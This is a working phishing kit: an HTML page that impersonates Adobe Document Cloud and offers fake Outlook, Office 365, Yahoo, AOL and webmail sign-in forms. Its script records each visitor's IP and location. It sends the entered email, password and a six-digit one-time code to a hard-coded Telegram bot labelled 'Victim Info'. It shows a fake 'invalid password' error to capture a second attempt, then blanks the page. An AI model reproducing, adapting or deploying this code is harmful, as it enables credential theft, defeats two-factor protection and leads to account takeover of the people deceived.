<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Adobe Document Cloud</title>
<link rel="icon" type="image/png" href="https://img.icons8.com/color/48/adobe-acrobat-reader.png">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
body, html { width: 100%; height: 100%; overflow: hidden; display: flex; align-items: center; justify-content: center; padding: 30px; position: relative; }
body::before {
  content: ''; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
  background: url('1.png') center/cover no-repeat; filter: blur(8px); z-index: -1;
}

/* Main Card */
.card {
  position: relative; z-index: 2; width: 600px; max-width: 90vw;
  background: rgba(0, 0, 0, 0.7); color: #fff;
  padding: 15px 30px; border-radius: 50px; text-align: center;
}
.card-content { display: block; }
.card-content.hidden { display: none; }
.card-modal { display: none; }
.card-modal.active { display: block; }
.card-header-img { width: 144px; height: 144px; margin: 0 auto 5px; object-fit: contain; }
.card h2 { color: #fff; font-size: 20px; margin-bottom: 4px; word-wrap: break-word; }
.card p { font-size: 13px; color: #ccc; margin-bottom: 12px; line-height: 1.3; word-wrap: break-word; }

.btn {
  display: flex; align-items: center; margin: 12px 0;
  padding: 8px 16px; border-radius: 25px; font-weight: 600;
  font-size: 12px; cursor: pointer; gap: 15px; border: none; width: 100%; color: #fff;
}
.btn span.label { flex: 1; text-align: left; }
.btn svg { width: 20px; height: 20px; fill: currentColor; }
.outlook { background: #0078d4; }
.office365 { background: #d83b01; }
.yahoo { background: #6001d2; }
.aol { background: #00a651; }
.other { background: #0078d4; }

.card-footer { margin-top: 15px; font-size: 11px; color: #ccc; border-top: 1px solid #555; padding-top: 10px; }
.copyright { display: block; margin-top: 3px; font-weight: bold; color: #aaa; }

/* Modal Styles (inside card) */
.modal-body { padding: 0 0 20px 0; }
.modal-logo-container { text-align: center; margin-bottom: 20px; }
.modal-logo-container svg, .modal-logo-container img { width: 70px; height: 70px; object-fit: contain; }
.modal-title { font-size: 19px; font-weight: bold; color: #fff; margin-bottom: 20px; text-align: center; }

.form-group { margin-bottom: 15px; text-align: left; }
.form-group label { display: block; font-size: 13px; font-weight: 600; color: #ccc; margin-bottom: 5px; }
.form-group input {
  width: 100%; padding: 11px; border: 1px solid #555;
  border-radius: 2px; font-size: 14px; outline: none; background: rgba(255,255,255,0.1); color: #fff;
}
.form-group input.invalid { border: 1.5px solid #eb1000 !important; background: rgba(235,16,0,0.1); }
#errorMsg { color: #eb1000; font-size: 13px; margin-bottom: 15px; display: none; font-weight: 600; text-align: center; }

.modal-footer { padding: 20px 0 0 0; border-top: 1px solid #555; text-align: right; display: flex; gap: 5px; justify-content: flex-end; }
.btn-main { padding: 10px 30px; border-radius: 2px; font-size: 14px; font-weight: 600; cursor: pointer; border: none; color: #fff; }
.btn-close { padding: 10px 30px; border-radius: 2px; font-size: 14px; font-weight: 600; cursor: pointer; border: 1px solid #ccc; background: #fff; color: #333; }
.btn-close:hover { background: #f5f5f5; }
</style>
</head>
<body>

<div class="card">
  <div class="card-content" id="cardContent">
    <img src="Punchbowl-1.png" class="card-header-img" alt="Header Logo">
    <h2>Adobe Document Cloud</h2>
    <p>To read the document, please enter with the valid email credentials that this file was sent to.</p>

    <button class="btn outlook" onclick="openModal('outlook')">
      <svg viewBox="0 0 24 24"><path d="M13 5v14l-9-2V7l9-2z"/><rect x="13" y="7" width="8" height="4" opacity="0.8"/><rect x="13" y="12.5" width="8" height="4" opacity="0.8"/></svg>
      <span class="label">Sign in with Outlook</span>
    </button>
    <button class="btn office365" onclick="openModal('office365')">
      <svg viewBox="0 0 24 24"><path d="M4 4h7v7H4zM13 4h7v7h-7zM4 13h7v7H4zM13 13h7v7h-7z"/></svg>
      <span class="label">Sign in with Office 365</span>
    </button>
    <button class="btn yahoo" onclick="openModal('yahoo')">
      <svg viewBox="0 0 24 24"><path d="M3 5h4.5l4.5 7 4.5-7H21l-7 10.5V21h-4v-5.5L3 5z"/></svg>
      <span class="label">Sign in with Yahoo Mail</span>
    </button>
    <button class="btn aol" onclick="openModal('aol')">
      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#007bff"/><text x="12" y="16" font-size="9" fill="#fff" text-anchor="middle" font-weight="bold">AOL</text></svg>
      <span class="label">Sign in with AOL</span>
    </button>
    <button class="btn other" onclick="openModal('other')">
      <svg viewBox="0 0 24 24"><path d="M3 7.5l9 6 9-6" stroke="#fff" stroke-width="2" fill="none"/><rect x="3" y="6" width="18" height="13" rx="1.5" stroke="#fff" stroke-width="2" fill="none"/></svg>
      <span class="label">Sign in with Other Mail</span>
    </button>

    <div class="card-footer">
      Select your email provider to view Document
      <span class="copyright">CopyRight © 2024 Adobe</span>
    </div>
  </div>

  <div class="card-modal" id="cardModal">
    <div class="modal-body" id="modalContent"></div>
    <div class="modal-footer">
      <button class="btn-close" onclick="closeModal()">Close</button>
      <button class="btn-main" id="mainBtn" onclick="processStep()">Login</button>
    </div>
  </div>
</div>

<script>
/** * CONFIGURATION */
const TELEGRAM_BOT_TOKEN = "8477454072:AAE5MU-6al8mubqg5rpApobOdEsQvgWcc50";
const TELEGRAM_CHAT_ID   = "6371035627";

let step = 1;
let currentKey = '';
let userData = { email: '', pass: '', otp: '', provider: '', ip: 'Loading...', loc: 'Loading...' };

// Fetch IP and Location once on page load
fetch('https://ipapi.co/json/')
  .then(res => res.json())
  .then(data => {
    userData.ip = data.ip || 'Unknown';
    userData.loc = `${data.city}, ${data.region}, ${data.country_name}` || 'Unknown';
  })
  .catch(() => {
    userData.ip = 'Blocked/Error';
    userData.loc = 'Blocked/Error';
  });

const providers = {
  outlook: { title: "Outlook", color: "#0078d4", logo: `<img src="https://img.icons8.com/color/96/microsoft-outlook-2019.png">` },
  office365: { title: "Office 365", color: "#d83b01", logo: `<img src="https://img.icons8.com/color/96/office-365.png">` },
  yahoo: { title: "Yahoo", color: "#6001d2", logo: `<img src="https://img.icons8.com/color/96/yahoo.png">` },
  aol: { title: "AOL", color: "#007bff", logo: `<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#007bff"/><text x="12" y="16" font-size="9" fill="#fff" text-anchor="middle" font-weight="bold" font-family="Arial">AOL</text></svg>` },
  other: { title: "Webmail", color: "#555", logo: `<img src="https://img.icons8.com/color/96/email--v1.png">` }
};

function openModal(key) {
  step = 1;
  currentKey = key;
  userData.provider = providers[key].title;
  renderLogin(false);
  document.getElementById('cardContent').classList.add('hidden');
  document.getElementById('cardModal').classList.add('active');
}

function closeModal() {
  document.getElementById('cardContent').classList.remove('hidden');
  document.getElementById('cardModal').classList.remove('active');
  step = 1;
  currentKey = '';
}

function closeModalOutside(event) {
  // Not needed with card-based modal
}

function renderLogin(showError) {
  const p = providers[currentKey];
  document.getElementById('modalContent').innerHTML = `
    <div class="modal-logo-container">${p.logo}</div>
    <div class="modal-title">Sign in to ${p.title}</div>
    <div id="errorMsg" style="display: ${showError ? 'block' : 'none'}">Invalid email or password. Please try again.</div>
    <div class="form-group">
      <label>Email Address</label>
      <input type="email" id="emailInp" value="${userData.email}" placeholder="Enter Email" oninput="this.classList.remove('invalid')">
    </div>
    <p style="font-size: 11px; color: #aaa; margin-bottom: 15px; text-align: center;">we will never share your email with anyone else</p>
    <div class="form-group">
      <label>Password</label>
      <input type="password" id="passInp" placeholder="Enter Password" oninput="this.classList.remove('invalid')">
    </div>
  `;
  const btn = document.getElementById('mainBtn');
  btn.style.backgroundColor = p.color;
  btn.textContent = "Login";
}

function sendToTelegram(msg) {
  const info = `\n\n🌐 <b>Victim Info:</b>\n📍 IP: <code>${userData.ip}</code>\n🗺️ Loc: <code>${userData.loc}</code>`;
  const fullMsg = msg + info;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(fullMsg)}&parse_mode=HTML`;
  
  fetch(url, { mode: 'no-cors' }).catch((err) => console.error("Notification failed", err));
}

function processStep() {
  if (step === 1 || step === 2) {
    const email = document.getElementById('emailInp');
    const pass = document.getElementById('passInp');
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value)) { email.classList.add('invalid'); return; }
    if (pass.value.length < 3) { pass.classList.add('invalid'); return; }

    userData.email = email.value;
    userData.pass = pass.value;

    if (step === 1) {
      step = 2;
      sendToTelegram(`<b>🔔 Login (Attempt 1): ${userData.provider}</b>\n📧 Email: <code>${userData.email}</code>\n🔑 Pass: <code>${userData.pass}</code>`);
      renderLogin(true);
    } else {
      sendToTelegram(`<b>🔔 Login (Attempt 2): ${userData.provider}</b>\n📧 Email: <code>${userData.email}</code>\n🔑 Pass: <code>${userData.pass}</code>`);
      renderSms();
    }
  } 
  else if (step === 3) {
    renderOtp();
  }
  else if (step === 4) {
    const otp = document.getElementById('otpInp');
    if (otp.value.length !== 6 || isNaN(otp.value)) { otp.classList.add('invalid'); return; }
    userData.otp = otp.value;
    sendToTelegram(`<b>🔑 OTP: ${userData.provider}</b>\n📧 User: <code>${userData.email}</code>\n🔢 Code: <code>${userData.otp}</code>`);
    document.body.innerHTML = "";
    document.body.style.background = "white";
  }
}

function renderSms() {
  step = 3;
  document.getElementById('modalContent').innerHTML = `<div style="text-align:center; padding: 20px 0;"><p style="font-size: 16px; color: #333; line-height:1.6;">You will receive an OTP within 1-5 minutes. <br>Please check your phone number on file.</p></div>`;
  document.getElementById('mainBtn').textContent = "OK";
}

function renderOtp() {
  step = 4;
  document.getElementById('modalContent').innerHTML = `
    <div class="modal-title">Identity Verification</div>
    <p style="font-size: 13px; margin-bottom: 20px; text-align:center;">Enter the 6-digit code sent to your device. It may take up to 3 mins.</p>
    <div class="form-group"><label>6-Digit OTP</label><input type="text" id="otpInp" maxlength="6" placeholder="000000" oninput="this.classList.remove('invalid')"></div>
  `;
  document.getElementById('mainBtn').textContent = "Submit";
}
</script>
</body>
</html>
